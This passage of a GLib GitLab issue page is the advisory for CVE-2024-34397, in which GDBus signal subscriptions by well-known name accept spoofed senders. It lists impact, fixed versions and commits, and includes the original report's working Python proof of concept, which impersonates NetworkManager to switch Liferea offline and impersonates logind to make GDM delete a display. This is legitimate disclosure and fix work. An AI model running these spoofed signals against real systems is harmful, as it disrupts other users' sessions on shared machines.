<span class="k">if</span> <span class="p">(</span><span class="n">online</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">is_nm_connected</span> <span class="p">(</span><span class="n">state</span><span class="p">))</span> <span class="p">{</span></span>&#x000A;<span id="LC16" class="line" lang="c">		<span class="n">debug</span> <span class="p">(</span><span class="n">DEBUG_NET</span><span class="p">,</span> <span class="s">"network manager: no network connection -&gt; going offline"</span><span class="p">);</span></span>&#x000A;<span id="LC17" class="line" lang="c">		<span class="n">network_monitor_set_online</span> <span class="p">(</span><span class="n">FALSE</span><span class="p">);</span></span>&#x000A;<span id="LC18" class="line" lang="c">	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">online</span> <span class="o">&amp;&amp;</span> <span class="n">is_nm_connected</span> <span class="p">(</span><span class="n">state</span><span class="p">))</span> <span class="p">{</span></span>&#x000A;<span id="LC19" class="line" lang="c">		<span class="n">debug</span> <span class="p">(</span><span class="n">DEBUG_NET</span><span class="p">,</span> <span class="s">"network manager: active connection -&gt; going online"</span><span class="p">);</span></span>&#x000A;<span id="LC20" class="line" lang="c">		<span class="n">network_monitor_set_online</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">);</span></span>&#x000A;<span id="LC21" class="line" lang="c">	<span class="p">}</span></span>&#x000A;<span id="LC22" class="line" lang="c"><span class="p">}</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="224:1-224:126" dir="auto">This approach can be used to impersonate any system bus service. For instance, the following attacks gdm impersonating logind:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="226:1-238:3" data-canonical-lang="python" class="code highlight js-syntax-highlight language-python" v-pre="true"><code><span id="LC1" class="line" lang="python"><span class="n">victim_bus_user</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">find_bus_service_with_process_string</span><span class="p">(</span></span>&#x000A;<span id="LC2" class="line" lang="python">   <span class="n">bus</span><span class="p">,</span> <span class="sh">"</span><span class="s">/usr/bin/gdm</span><span class="sh">"</span><span class="p">)</span></span>&#x000A;<span id="LC3" class="line" lang="python"><span class="n">malicious_msg</span> <span class="o">=</span> <span class="n">Message</span><span class="p">.</span><span class="nf">new_signal</span><span class="p">(</span></span>&#x000A;<span id="LC4" class="line" lang="python">    <span class="n">path</span><span class="o">=</span><span class="sh">"</span><span class="s">/org/freedesktop/login1</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC5" class="line" lang="python">    <span class="n">interface</span><span class="o">=</span><span class="sh">"</span><span class="s">org.freedesktop.login1.Manager</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC6" class="line" lang="python">    <span class="n">member</span><span class="o">=</span><span class="sh">"</span><span class="s">SeatRemoved</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC7" class="line" lang="python">    <span class="n">signature</span><span class="o">=</span><span class="sh">"</span><span class="s">so</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC8" class="line" lang="python">    <span class="n">body</span><span class="o">=</span><span class="p">[</span></span>&#x000A;<span id="LC9" class="line" lang="python">        <span class="sh">"</span><span class="s">seat0</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC10" class="line" lang="python">        <span class="sh">"</span><span class="s">/org/freedesktop/login1/seat/seat0</span><span class="sh">"</span></span>&#x000A;<span id="LC11" class="line" lang="python">    <span class="p">])</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="240:1-240:252" dir="auto">By using D-Feet you can see the D-Bus tree for org.gnome.DisplayManager and how if you run that script, the entry under /org/gnome/DisplayManager/Displays/ is deleted as GDM uses g_dbus_connection_signal_subscribe() to handle the "SeatRemoved" signals:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="242:1-257:3" data-canonical-lang="c" class="code highlight js-syntax-highlight language-c" v-pre="true"><code><span id="LC1" class="line" lang="c"><span class="k">static</span> <span class="kt">void</span></span>&#x000A;<span id="LC2" class="line" lang="c"><span class="nf">on_seat_removed</span> <span class="p">(</span><span class="n">GDBusConnection</span> <span class="o">*</span><span class="n">connection</span><span class="p">,</span></span>&#x000A;<span id="LC3" class="line" lang="c">                 <span class="k">const</span> <span class="n">gchar</span>     <span class="o">*</span><span class="n">sender_name</span><span class="p">,</span></span>&#x000A;<span id="LC4" class="line" lang="c">                 <span class="k">const</span> <span class="n">gchar</span>     <span class="o">*</span><span class="n">object_path</span><span class="p">,</span></span>&#x000A;<span id="LC5" class="line" lang="c">                 <span class="k">const</span> <span class="n">gchar</span>     <span class="o">*</span><span class="n">interface_name</span><span class="p">,</span></span>&#x000A;<span id="LC6" class="line" lang="c">                 <span class="k">const</span> <span class="n">gchar</span>     <span class="o">*</span><span class="n">signal_name</span><span class="p">,</span></span>&#x000A;<span id="LC7" class="line" lang="c">                 <span class="n">GVariant</span>        <span class="o">*</span><span class="n">parameters</span><span class="p">,</span></span>&#x000A;<span id="LC8" class="line" lang="c">                 <span class="n">gpointer</span>         <span class="n">user_data</span><span class="p">)</span></span>&#x000A;<span id="LC9" class="line" lang="c"><span class="p">{</span></span>&#x000A;<span id="LC10" class="line" lang="c">        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">seat</span><span class="p">;</span></span>&#x000A;<span id="LC11" class="line" lang="c"></span>&#x000A;<span id="LC12" class="line" lang="c">        <span class="n">g_variant_get</span> <span class="p">(</span><span class="n">parameters</span><span class="p">,</span> <span class="s">"(&amp;s&amp;o)"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">seat</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span></span>&#x000A;<span id="LC13" class="line" lang="c">        <span class="n">delete_display</span> <span class="p">(</span><span class="n">GDM_LOCAL_DISPLAY_FACTORY</span> <span class="p">(</span><span class="n">user_data</span><span class="p">),</span> <span class="n">seat</span><span class="p">);</span></span>&#x000A;<span id="LC14" class="line" lang="c"><span class="p">}</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="259:1-270:3" data-canonical-lang="c" class="code highlight js-syntax-highlight language-c" v-pre="true"><code><span id="LC1" class="line" lang="c"><span class="n">factory</span><span class="o">-&gt;</span><span class="n">seat_removed_id</span> <span class="o">=</span> <span class="n">g_dbus_connection_signal_subscribe</span> <span class="p">(</span><span class="n">factory</span><span class="o">-&gt;</span><span class="n">connection</span><span class="p">,</span></span>&#x000A;<span id="LC2" class="line" lang="c">                                                              <span class="s">"org.freedesktop.login1"</span><span class="p">,</span></span>&#x000A;<span id="LC3" class="line" lang="c">                                                              <span class="s">"org.freedesktop.login1.Manager"</span><span class="p">,</span></span>&#x000A;<span id="LC4" class="line" lang="c">                                                              <span class="s">"SeatRemoved"</span><span class="p">,</span></span>&#x000A;<span id="LC5" class="line" lang="c">                                                              <span class="s">"/org/freedesktop/login1"</span><span class="p">,</span></span>&#x000A;<span id="LC6" class="line" lang="c">                                                              <span class="nb">NULL</span><span class="p">,</span></span>&#x000A;<span id="LC7" class="line" lang="c">                                                              <span class="n">G_DBUS_SIGNAL_FLAGS_NONE</span><span class="p">,</span></span>&#x000A;<span id="LC8" class="line" lang="c">                                                              <span class="n">on_seat_removed</span><span class="p">,</span></span>&#x000A;<span id="LC9" class="line" lang="c">                                                              <span class="n">g_object_ref</span> <span class="p">(</span><span class="n">factory</span><span class="p">),</span></span>&#x000A;<span id="LC10" class="line" lang="c">                                                              <span class="n">g_object_unref</span><span class="p">);</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h2 data-sourcepos="272:1-272:12" dir="auto">&#x000A;<a id="user-content-discovery" class="anchor" href="#discovery" aria-hidden="true"></a>Discovery</h2>&#x000A;<p data-sourcepos="274:1-274:98" dir="auto">I found this bug after finding a typo in one of the D-Bus strings of gnome-shell screen recording.</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="276:1-290:3" data-canonical-lang="js" class="code highlight js-syntax-highlight language-javascript" v-pre="true"><code><span id="LC1" class="line" lang="javascript"><span class="k">this</span><span class="p">.</span><span class="nx">_streamProxy</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ScreenCastStreamProxy</span><span class="p">(</span><span class="nx">Gio</span><span class="p">.</span><span class="nx">DBus</span><span class="p">.</span><span class="nx">session</span><span class="p">,</span></span>&#x000A;<span id="LC2" class="line" lang="javascript">    <span class="dl">'</span><span class="s1">org.gnome.ScreenCast.Stream</span><span class="dl">'</span><span class="p">,</span> <span class="c1">// &lt;-- should be 'org.gnome.Mutter.ScreenCast.Stream'</span></span>&#x000A;<span id="LC3" class="line" lang="javascript">    <span class="nx">streamPath</span><span class="p">);</span></span>&#x000A;<span id="LC4" class="line" lang="javascript"></span>&#x000A;<span id="LC5" class="line" lang="javascript"><span class="k">this</span><span class="p">.</span><span class="nx">_streamProxy</span><span class="p">.</span><span class="nf">connectSignal</span><span class="p">(</span><span class="dl">'</span><span class="s1">PipeWireStreamAdded</span><span class="dl">'</span><span class="p">,</span></span>&#x000A;<span id="LC6" class="line" lang="javascript">    <span class="p">(</span><span class="nx">_proxy</span><span class="p">,</span> <span class="nx">_sender</span><span class="p">,</span> <span class="nx">params</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span></span>&#x000A;<span id="LC7" class="line" lang="javascript">        <span class="kd">const</span> <span class="p">[</span><span class="nx">nodeId</span><span class="p">]</span> <span class="o">=</span> <span class="nx">params</span><span class="p">;</span></span>&#x000A;<span id="LC8" class="line" lang="javascript">        <span class="k">this</span><span class="p">.</span><span class="nx">_nodeId</span> <span class="o">=</span> <span class="nx">nodeId</span><span class="p">;</span></span>&#x000A;<span id="LC9" class="line" lang="javascript"></span>&#x000A;<span id="LC10" class="line" lang="javascript">        <span class="k">this</span><span class="p">.</span><span class="nx">_pipelineState</span> <span class="o">=</span> <span class="nx">PipelineState</span><span class="p">.</span><span class="nx">STARTING</span><span class="p">;</span></span>&#x000A;<span id="LC11" class="line" lang="javascript">        <span class="k">this</span><span class="p">.</span><span class="nx">_pipelineConfigs</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">_getPipelineConfigs</span><span class="p">();</span></span>&#x000A;<span id="LC12" class="line" lang="javascript">        <span class="k">this</span><span class="p">.</span><span class="nf">_tryNextPipeline</span><span class="p">();</span></span>&#x000A;<span id="LC13" class="line" lang="javascript">    <span class="p">});</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="292:1-292:206" dir="auto">I was very confused that the screen recording application (which internally uses GDBusProxy through GJS and GObject-introspection) was able to handle the signal despite listening for the wrong service name.</p>&#x000A;<p data-sourcepos="294:1-294:102" dir="auto">The signal delivery turned out to only be possible due to a number of coincidences including this bug.</p></div>
</div>
<div class="edited-text gl-mt-4 gl-text-gray-500 gl-text-sm">Edited <time class="js-timeago issue-edited-ago js-issue-edited-ago" title="May 8, 2024 3:03pm" datetime="2024-05-08T15:03:53Z" data-toggle="tooltip" data-placement="bottom" data-container="body">May 08, 2024</time> by <a class="author-link hover:gl-underline gl-text-gray-700 js-user-link" data-user-id="1115" data-username="smcv" data-name="Simon McVittie" href="/smcv"><span class="">Simon McVittie</span></a></div>
</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/658/issues/3268/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="js-design-management" data-issue-iid="3268" data-issue-path="/GNOME/glib/-/issues/3268" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-project-path="GNOME/glib" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div class="js-work-item-links-root" data-full-path="GNOME/glib" data-issuable-id="195110" data-issuable-iid="3268" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-default-branch="main" data-wi-full-path="GNOME/glib" data-wi-group-path="GNOME" data-wi-is-signed-in="false" data-wi-issues-list-path="/GNOME/glib/-/issues" data-wi-labels-manage-path="/GNOME/glib/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/GNOME/glib/-/issues/3268/links" data-full-path="GNOME/glib" data-has-issue-weights-feature="false" data-has-iterations-feature="false" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="false" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-default-branch="main" data-wi-full-path="GNOME/glib" data-wi-group-path="GNOME" data-wi-is-signed-in="false" data-wi-issues-list-path="/GNOME/glib/-/issues" data-wi-labels-manage-path="/GNOME/glib/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="true" data-iid="3268" data-project-path="GNOME/glib" id="js-related-merge-requests"></div>
<div data-url="/GNOME/glib/-/issues/3268/related_branches" id="related-branches">
</div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:195110,&quot;iid&quot;:3268,&quot;description&quot;:&quot;## Vulnerability summary\n\nAlicia Boya García discovered a security issue in GLib&#39;s `GDBusConnection`. When subscribing to a D-Bus signal using a well-known name such as `com.example.Foo`, the signal subscription mechanism did not check that the sender of the signal was genuinely the owner of the desired name.\n\nCVE-2024-34397 has been allocated for this vulnerability.\n\n### Impact\n\nWhen a GDBus-based client subscribes to signals from a trusted system service such as NetworkManager or systemd-logind on a shared computer, other users of the same computer can send spoofed D-Bus signals that the GDBus-based client will wrongly interpret as having been sent by the trusted system service. This could lead to the GDBus-based client behaving incorrectly, with an application-dependent impact.\n\n### Fixed versions\n\nPlease note that initial fixes for this vulnerability caused a regression for users of ibus (#3353) which should also be addressed by distributors.\n\n* GLib 2.80.x ≥ 2.80.1 (stable branch) by !4039; regression fix for #3353 in 2.80.2 via !4055 \n* GLib 2.78.x ≥ 2.78.5 (old stable branch) by !4040; regression fix for #3353 in 2.78.6 via !4056 \n* GLib ≥ 2.81.0 (development branch) by !4038; regression fix for #3353 via !4053\n\nOlder branches such as 2.76.x are EOL and will not receive new upstream releases, but downstream distributions are likely to backport the fixes.\n\n### Vulnerable versions\n\n* GLib 2.80.x before 2.80.1\n* all versions before 2.78.5\n\n### Workarounds/mitigations\n\nSubscribing to a signal by its sender&#39;s D-Bus unique name (such as `:1.42`) is not affected.\n\nSubscribing to a signal from the D-Bus message bus by its name `org.freedesktop.DBus` is not affected. This is a special name defined by the D-Bus protocol, which has the syntax of a well-known name, but behaves like a unique name (and in particular can appear in the sender field of a message).\n\nPrograms that use `g_dbus_connection_signal_subscribe()` for a well-known name such as `com.example.Foo` could mitigate this vulnerability by tracking the current owner of the well-known name themselves, for example by using `g_bus_watch_name()`, and ignoring any calls to the `GDBusSignalCallback` where the `sender_name` does not match the name&#39;s current owner.\n\n### Fixes\n\nFixing this vulnerability requires multiple changes to GLib:\n\n* 1e648b67 \&quot;gdbusprivate: Add symbolic constants for the message bus itself\&quot;\n* 8dfea560 \&quot;gdbusconnection: Move SignalData, SignalSubscriber higher up\&quot;\n* 816da605 \&quot;gdbusconnection: Factor out signal_data_new_take()\&quot;\n* 5d7ad689 \&quot;gdbusconnection: Factor out add_signal_data()\&quot;\n* 7d21b719 \&quot;gdbusconnection: Factor out remove_signal_data_if_unused\&quot;\n* 26a3fb85 \&quot;gdbusconnection: Stop storing sender_unique_name in SignalData\&quot;\n* 683b14b9 \&quot;gdbus: Track name owners for signal subscriptions\&quot;\n* d4b65376 \&quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\&quot;\n* 7d65f6c5 \&quot;gdbusconnection: Allow name owners to have the syntax of a well-known name\&quot; (regression fix, see #3353; added in 2.80.2)\n\nThe bug fix commits 10e9a917 \&quot;gdbusmessage: Cache the arg0 value\&quot; and 7b15b1db \&quot;gdbus-proxy test: Wait before asserting name owner has gone away\&quot; are not required to fix the vulnerability, but applying them in addition is recommended. When applying the vulnerability fix without those commits, GLib test failures were observed.\n\nWhen backporting to older stable release branches, a backport of `g_set_str()` will be required, for example 67052fed \&quot;gdbusconnection: Make a backport of g_set_str() available\&quot; in !4041.\n\nFixing this vulnerability will trigger a regression in GNOME Shell&#39;s implementation of screen recording and screencasting, due to a pre-existing GNOME Shell bug. Applying commit GNOME/gnome-shell@50a011a1 \&quot;screencast: Correct expected bus name for streams\&quot; to GNOME Shell fixes that regression. In distributions that ship GNOME Shell, it is recommended to make that change as part of the same security update that fixes the GLib vulnerability.\n\n!4041 and !4042 contain unofficial backports to GLib 2.74.x (for Debian 12) and 2.66.x (for Debian 11) which other distributors might find useful as a starting point.\n\n#### Test coverage\n\n* 124b4571 \&quot;tests: Add a data-driven test for signal subscriptions\&quot;\n* 14c3d693 \&quot;tests: Add support for subscribing to signals from a well-known name\&quot;\n* 984354e0 \&quot;tests: Add a test-case for what happens if a unique name doesn&#39;t exist\&quot;\n* fd265663 \&quot;tests: Add test coverage for signals that match the message bus&#39;s name\&quot;\n* fc0ee920 \&quot;tests: Add a test for matching by two well-known names\&quot;\n* f6d1b547 \&quot;tests: Add a test for signal filtering by well-known name\&quot;\n* 96e3190a \&quot;tests: Ensure that unsubscribing with GetNameOwner in-flight doesn&#39;t crash\&quot;\n\nThese tests are included in !4038, !4039, !4040, !4041, !4042.\n\n---\n\n## Original report\n\nGDBus subscriptions to well-known services are vulnerable to unicast spoofing\n\nWhen `g_dbus_connection_signal_subscribe()` is called with a well-known bus service name (e.g. `org.freedesktop.login1`) as value for the `sender` argument, the following occurs:\n\n1. `args_to_rule()` is called, creating a D-Bus match rule string that contains the well-known name.\n2. The local variable `sender_unique_name` is set to `\&quot;\&quot;`, as it is a well-known name rather than a unique name.\n3. The `map_rule_to_signal_data` hash table is used to look for a previous `SignalData` structure for that exact rule string. Let&#39;s assume none exist.\n4. A `SignalData` structure is created with the well-known name as `sender` and empty string as `sender_unique_name`, then a pointer to the `SignalData` is stored in `map_rule_to_signal_data` for future occurrences.\n5. An `AddMatch` message is sent to `org.freedesktop.DBus` with the rule string.\n6. A pointer to `SignalData` is stored in `map_sender_unique_name_to_signal_data_array` with key `signal_data-\u003esender_unique_name`, **hence empty string**.\n\nLater, the process may receive a D-Bus signal.\n\n1. `distribute_signals()` gets called with the signal message.\n2. `map_sender_unique_name_to_signal_data_array` is queried with the unique name of the sender of the signal as key. Nothing is found.\n3. `map_sender_unique_name_to_signal_data_array` is queried with the empty string as key and `schedule_callbacks()` is called on the entries.\n4. `schedule_callbacks()` iterates through the array of `SignalData*` discarding `SignalData` structures where either:\n\n   a) The interface name doesn&#39;t match.\n\n   b) The member (i.e. signal name) doesn&#39;t match.\n\n   c) The object path doesn&#39;t match.\n\n   d) The signal arguments don&#39;t match.\n\n5. The signal callback is called without any further verification.\n\n**Notice that \&quot;The sender doesn&#39;t match\&quot; is not along these checks.** GDBus assumes that either has already been checked by indexing `map_sender_unique_name_to_signal_data_array` (which is only true for well-known names and `org.freedesktop.DBus`) or that the D-Bus broker wouldn&#39;t send such a message due to it being filtered by the match rule. However, there is at least one case described in the D-Bus specification in which this is not sufficient:\n\n\u003e Messages may have a DESTINATION field (see the section called “Header Fields”), resulting in a unicast message. If the DESTINATION field is present, it specifies a message recipient by name. Method calls and replies normally specify this field. **The message bus must send messages (of any type) with the DESTINATION field set to the specified recipient, regardless of whether the recipient has set up a match rule matching the message.**\n\nTherefore, an attacker on the same bus, even if unable to own any well-known names as it&#39;s the case by default in the SYSTEM bus, can construct a unicast DBus signal message with `DESTINATION` being the targeted application and send a signal with identical interface name, member, object path and matching arguments in order to spoof a D-Bus service with a well-known name. \n\nThe signal will trigger the invocation of the callback and it would be up to the application to validate the `sender` argument and not blindly trust the received signal arguments. This is a problem when the application passed a well-known service name as the `sender` argument for `g_dbus_connection_signal_subscribe()` expecting GDBus -- somewhat reasonably -- to do this filtering on its behalf.\n\ng_dbus_connection_signal_subscribe() is also used internally by GDBus, maybe most notably by GDBusProxy.  Fortunately there is this additional check in `gdbusproxy.c`:\n\n```c\nstatic void\non_signal_received (GDBusConnection *connection,\n                    const gchar     *sender_name,\n                    const gchar     *object_path,\n                    const gchar     *interface_name,\n                    const gchar     *signal_name,\n                    GVariant        *parameters,\n                    gpointer         user_data)\n{\n  GWeakRef *proxy_weak = user_data;\n  GDBusProxy *proxy;\n\n  proxy = G_DBUS_PROXY (g_weak_ref_get (proxy_weak));\n  // ...\n  if (proxy-\u003epriv-\u003ename_owner != NULL \u0026\u0026 g_strcmp0 (sender_name, proxy-\u003epriv-\u003ename_owner) != 0)\n    {\n      // ...\n      goto out;\n    }\n```\n\nThanks to that additional check, users of GDBusProxy (e.g. those making use of the GLib signals `&#39;g-signal&#39;` and `&#39;g-properties-changed&#39;` instead of calling `g_dbus_connection_signal_subscribe()` for signal subscriptions) are not affected unless `proxy-\u003epriv-\u003ename_owner` is NULL, which will only happen if the provided well-known name doesn&#39;t exist in the bus.\n\n## Proof of concept\n\nFor a harmless proof of concept targetting the system bus, let&#39;s impersonate NetworkManager to convince the RSS reader Liferea that we are offline when we&#39;re actually online, or vice versa. The following is Python code. The packages dbus-fast and psutil must be installed and Liferea must be running.\n\n```python\nfrom dbus_fast import BusType, Message\nfrom dbus_fast.signature import Variant\nfrom dbus_fast.aio.message_bus import MessageBus\n\nimport asyncio\nimport psutil\n\nasync def find_bus_service_with_process_string(bus: MessageBus, process_str: str) -\u003e str:\n    dbus_introspection = await bus.introspect(\n        \&quot;org.freedesktop.DBus\&quot;, \&quot;/org/freedesktop/DBus\&quot;)\n    dbus_proxy = bus.get_proxy_object(\n        \&quot;org.freedesktop.DBus\&quot;, \&quot;/org/freedesktop/DBus\&quot;,\n        dbus_introspection)\n    dbus_iface = dbus_proxy.get_interface(\&quot;org.freedesktop.DBus\&quot;)\n    # Check the connections one by one to find the target\n    for service_name in await dbus_iface.call_list_names():\n        pid = await dbus_iface.call_get_connection_unix_process_id(service_name)\n        cmdline = &#39; &#39;.join(psutil.Process(pid).cmdline())\n        if process_str in cmdline:\n            return service_name\n\nNM_STATE_DISCONNECTED = 20\nNM_STATE_CONNECTED_GLOBAL = 70\n\nasync def main():\n    bus = await MessageBus(bus_type=BusType.SYSTEM).connect()\n    victim_bus_user = await find_bus_service_with_process_string(bus,\n        \&quot;/liferea\&quot;)\n    malicious_msg = Message.new_signal(\n        path=\&quot;/org/freedesktop/NetworkManager\&quot;,\n        interface=\&quot;org.freedesktop.NetworkManager\&quot;,\n        member=\&quot;StateChanged\&quot;,\n        signature=\&quot;u\&quot;,\n        body=[\n            NM_STATE_DISCONNECTED\n        ],\n    )\n    malicious_msg.destination = victim_bus_user\n    await bus.send(malicious_msg)\n\nasyncio.run(main())\n```\n\nAfter running the script, try clicking in \&quot;Update all\&quot; in Liferea and you&#39;ll see \&quot;Liferea is in offline mode. No update is possible.\&quot; If you edit the script to send NM_STATE_CONNECTED_GLOBAL it will fetch news once again.\n\nThis is because Liferea uses g_dbus_connection_signal_subscribe() to listen for the StateChanged signal filtering by sender and then trusts the signals:\n\n```c\nself-\u003epriv-\u003esubscription_id = g_dbus_connection_signal_subscribe (self-\u003epriv-\u003econn,\n                                                                 \&quot;org.freedesktop.NetworkManager\&quot;,\n                                                                 \&quot;org.freedesktop.NetworkManager\&quot;,\n                                                                 \&quot;StateChanged\&quot;,\n                                                                 NULL,\n                                                                 NULL,\n                                                                 G_DBUS_SIGNAL_FLAGS_NONE,\n                                                                 on_network_state_changed_cb,\n                                                                 self,\n                                                                 NULL);\n```\n\n```c\nstatic void\non_network_state_changed_cb (GDBusConnection *connection,\n\t\t\t     const gchar *sender_name,\n\t\t\t     const gchar *object_path,\n\t\t\t     const gchar *interface_name,\n\t\t\t     const gchar *signal_name,\n\t\t\t     GVariant *parameters,\n\t\t\t     gpointer user_data)\n{\n\tgboolean online = network_monitor_is_online ();\n\tguint state;\n\n\tg_variant_get (parameters, \&quot;(u)\&quot;, \u0026state);\n\n\tif (online \u0026\u0026 !is_nm_connected (state)) {\n\t\tdebug (DEBUG_NET, \&quot;network manager: no network connection -\u003e going offline\&quot;);\n\t\tnetwork_monitor_set_online (FALSE);\n\t} else if (!online \u0026\u0026 is_nm_connected (state)) {\n\t\tdebug (DEBUG_NET, \&quot;network manager: active connection -\u003e going online\&quot;);\n\t\tnetwork_monitor_set_online (TRUE);\n\t}\n}\n```\n\nThis approach can be used to impersonate any system bus service. For instance, the following attacks gdm impersonating logind:\n\n```python\nvictim_bus_user = await find_bus_service_with_process_string(\n   bus, \&quot;/usr/bin/gdm\&quot;)\nmalicious_msg = Message.new_signal(\n    path=\&quot;/org/freedesktop/login1\&quot;,\n    interface=\&quot;org.freedesktop.login1.Manager\&quot;,\n    member=\&quot;SeatRemoved\&quot;,\n    signature=\&quot;so\&quot;,\n    body=[\n        \&quot;seat0\&quot;,\n        \&quot;/org/freedesktop/login1/seat/seat0\&quot;\n    ])\n```\n\nBy using D-Feet you can see the D-Bus tree for org.gnome.DisplayManager and how if you run that script, the entry under /org/gnome/DisplayManager/Displays/ is deleted as GDM uses g_dbus_connection_signal_subscribe() to handle the \&quot;SeatRemoved\&quot; signals:\n\n```c\nstatic void\non_seat_removed (GDBusConnection *connection,\n                 const gchar     *sender_name,\n                 const gchar     *object_path,\n                 const gchar     *interface_name,\n                 const gchar     *signal_name,\n                 GVariant        *parameters,\n                 gpointer         user_data)\n{\n        const char *seat;\n\n        g_variant_get (parameters, \&quot;(\u0026s\u0026o)\&quot;, \u0026seat, NULL);\n        delete_display (GDM_LOCAL_DISPLAY_FACTORY (user_data), seat);\n}\n```\n\n```c\nfactory-\u003eseat_removed_id = g_dbus_connection_signal_subscribe (factory-\u003econnection,\n                                                              \&quot;org.freedesktop.login1\&quot;,\n                                                              \&quot;org.freedesktop.login1.Manager\&quot;,\n                                                              \&quot;SeatRemoved\&quot;,\n                                                              \&quot;/org/freedesktop/login1\&quot;,\n                                                              NULL,\n                                                              G_DBUS_SIGNAL_FLAGS_NONE,\n                                                              on_seat_removed,\n                                                              g_object_ref (factory),\n                                                              g_object_unref);\n```\n\n## Discovery\n\nI found this bug after finding a typo in one of the D-Bus strings of gnome-shell screen recording.\n\n```js\nthis._streamProxy = new ScreenCastStreamProxy(Gio.DBus.session,\n    &#39;org.gnome.ScreenCast.Stream&#39;, // \u003c-- should be &#39;org.gnome.Mutter.ScreenCast.Stream&#39;\n    streamPath);\n\nthis._streamProxy.connectSignal(&#39;PipeWireStreamAdded&#39;,\n    (_proxy, _sender, params) =\u003e {\n        const [nodeId] = params;\n        this._nodeId = nodeId;\n\n        this._pipelineState = PipelineState.STARTING;\n        this._pipelineConfigs = this._getPipelineConfigs();\n        this._tryNextPipeline();\n    });\n```\n\nI was very confused that the screen recording application (which internally uses GDBusProxy through GJS and GObject-introspection) was able to handle the signal despite listening for the wrong service name.\n\nThe signal delivery turned out to only be possible due to a number of coincidences including this bug.&quot;,&quot;title&quot;:&quot;CVE-2024-34397: GDBus signal subscriptions for well-known names are vulnerable to unicast 